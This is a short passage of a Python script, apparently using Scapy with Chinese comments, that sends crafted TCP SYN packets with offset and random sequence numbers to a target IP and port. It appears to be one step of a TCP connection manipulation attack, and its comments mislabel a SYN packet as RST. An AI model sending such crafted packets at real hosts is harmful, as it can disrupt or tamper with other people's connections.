...
# 步骤 2: 发送 RST2_i 包
syn2_i = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=syn_ack.ack+200)
send(syn2_i)  # 发送 RST2_i

print("[*] 发送 SYN2_i")

# 步骤 3: 发送包
syn3_i = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=rand_seq)
#send(syn2_v)  
send(syn3_i) 
